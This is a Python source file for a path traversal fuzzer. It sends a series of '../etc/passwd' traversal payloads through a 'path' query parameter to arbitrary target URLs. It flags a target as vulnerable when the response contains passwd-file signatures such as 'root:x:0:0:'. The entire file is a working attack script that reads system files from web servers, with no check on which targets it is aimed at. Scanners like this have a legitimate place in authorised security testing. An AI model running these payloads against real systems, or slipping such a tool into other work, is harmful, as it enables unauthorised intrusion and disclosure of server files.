import requests

class TraversalFuzzer:
    def __init__(self):
        self.name = "Path Traversal Fuzzer"
        self.payloads = [
            "../etc/passwd",
            "../../etc/passwd",
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd"
        ]
        self.signatures = [
            "root:x:0:0:", "/bin/bash", "nobody:x:", "/home"
        ]

    def run_tests(self, targets):
        results = {}
        for target in targets:
            for payload in self.payloads:
                test_url = f"{target}?path={payload}"
                status, response_text = self.send_request(test_url)
                is_vulnerable = self.analyze_response(response_text)
                results[test_url] = {
                    "status": status,
                    "vulnerable": is_vulnerable
                }
        return results

    def send_request(self, url):
        try:
            response = requests.get(url, timeout=5)
            return response.status_code, response.text[:1000]
        except requests.exceptions.RequestException:
            return "ERROR", "No response"

    def analyze_response(self, text):
        for sig in self.signatures:
            if sig in text:
                return True
        return False
